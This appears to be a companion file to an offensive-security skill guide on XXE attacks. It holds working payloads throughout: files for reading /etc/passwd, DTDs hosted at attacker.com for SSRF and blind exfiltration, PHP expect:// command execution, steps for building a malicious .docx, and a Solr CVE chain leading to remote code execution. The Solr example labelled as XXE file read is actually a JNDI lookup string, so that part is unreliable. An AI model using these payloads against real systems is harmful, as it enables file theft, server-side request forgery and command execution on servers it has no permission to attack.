# XXE — Extended Scenarios & Real-World Cases

> Companion to [SKILL.md](./SKILL.md). Contains additional CVE case studies and exploitation techniques.

---

## 1. CVE Case: Apache Solr XXE + RCE (CVE-2017-12629)

Apache Solr's Config API accepts XML with external entity processing enabled, and the Velocity Response Writer allows template injection:

**XXE for file read**:
```
GET /solr/CORE/select?q=xxx&wt=xml&defType=edismax&echoParams=all&fl=id,name&sort=${jndi:ldap://attacker/x}
```

**Combined XXE + RCE chain**:
1. Use XXE to read Solr configuration and identify available cores
2. Use Config API to register a new VelocityResponseWriter with `solr.resource.loader.enabled=true`
3. Execute Velocity template with `Runtime.exec()`

---

## 2. Office Document XXE — Step-by-Step

OOXML files (`.docx`, `.xlsx`, `.pptx`) are ZIP archives containing XML:

```bash
# Step 1: Create a legitimate .docx
# Step 2: Extract
mkdir extracted && cd extracted
unzip ../document.docx

# Step 3: Inject XXE into word/document.xml
# Add after <?xml version="1.0"...?>:
# <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
# Then replace a text element with &xxe;

# Step 4: Also try [Content_Types].xml:
# <!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com/notify">]>

# Step 5: Repackage
zip -r ../malicious.docx .

# Step 6: Upload to target application
# If the app parses the XML → XXE triggers
```

**Common targets**: document preview, import functionality, file conversion services.

---

## 3. DOCTYPE-Based SSRF

Even when the application doesn't reflect entity values, `DOCTYPE` with `PUBLIC` or `SYSTEM` triggers an HTTP request:

```xml
<!DOCTYPE foo PUBLIC "-//attacker//DTD//EN" "http://attacker.com/notify">
<root>normal content</root>
```

The XML parser fetches the DTD from `attacker.com` — confirms SSRF even without entity reflection.

---

## 4. PHP expect:// Protocol via XXE

When PHP's `expect` extension is installed:

```xml
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect://id">]>
<root>&xxe;</root>
```

The `expect://` wrapper executes the command and returns output. Rare but devastating when available.

**Check availability**: `phpinfo()` → look for "expect" in loaded extensions.

---

## 5. XXE in SOAP Web Services

SOAP endpoints parse XML by design — always test for XXE:

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <getUser><id>&xxe;</id></getUser>
  </soap:Body>
</soap:Envelope>
```

Also test the `SOAPAction` header and WSDL import endpoints.

---

## 6. Blind XXE via Error Messages

When OOB HTTP exfiltration is blocked, use error-based exfiltration:

```xml
<!-- Hosted at attacker.com/error.dtd: -->
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
```

The parser tries to open `file:///nonexistent/root:x:0:0:...` → error message contains file contents.
